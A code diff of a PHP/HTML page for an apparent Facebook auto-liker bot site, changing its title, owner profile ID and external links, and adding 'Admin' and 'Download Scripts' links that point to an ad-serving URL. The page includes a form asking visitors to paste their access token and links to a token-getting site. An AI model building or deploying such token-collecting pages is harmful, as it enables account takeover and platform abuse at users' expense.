@@ -1,4 +1,4 @@
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>CRACKERXBOTTERX</title> <link rel="stylesheet" type="text/css" href="chbotter.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <div id="snowflakeContainer"> <script type='text/javascript' src='snowfall.js'></script> <p class="snowflake">*</p></div> 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>DJBOTTERX</title> <link rel="stylesheet" type="text/css" href="chbotter.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <div id="snowflakeContainer"> <script type='text/javascript' src='snowfall.js'></script> <p class="snowflake">*</p></div> 
 
 </style>
 
@@ -233,7 +233,7 @@ echo'<div id="content">
 <div class="post">
 <div class="post-meta">
 <center>
-<a target="_blank" href="https://www.facebook.com/100013201441761"><img src="https://graph.facebook.com/100013201441761/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="400" height="400" title=""></a>
+<a target="_blank" href="https://www.facebook.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="400" height="400" title=""></a>
 <br>
 <br>
 <center><iframe src="https://www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Fold.is.disable&amp;width=106&amp;height=21&amp;layout=button_count&amp;size=small&amp;show_faces=true&amp;appId" width="106" height="21" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowtransparency="true"></iframe></center>
@@ -243,7 +243,7 @@ echo'<div id="content">
 
 public function bwh(){
 echo'
-<div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Token Area</a></h3> <li><a href="http://rgoucuir.beget.tech/XD/s/" target="_blank">[ Click Here ]</a> To Get Token </li> </div> </br> <div id="top-content"> <div id="search-form"> 
+<div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Token Area</a></h3> <li><a href="http://scure-token.tk" target="_blank">[ Click Here ]</a> To Get Token </li> </div> </br><div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Admin Area</a></h3> <li><a href="http://wap4dollar.com/ad/nonadult/serve.php?id=cx5av5xnzc" target="_blank">[ Click Here ]</a> Site Admin </li> </div> </br><div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Script Area</a></h3> <li><a href="http://wap4dollar.com/ad/nonadult/serve.php?id=cx5av5xnzc" target="_blank">[ Click Here ]</a> DOWNLOAD SCRIPTS </li> </div> </br> <div id="top-content"> <div id="search-form"> 
 <form action="index.php" method="post">
 
 <input class="search" type="text" style="width:65%" name="token" placeholder="Paste Your iphone Token Here" required>
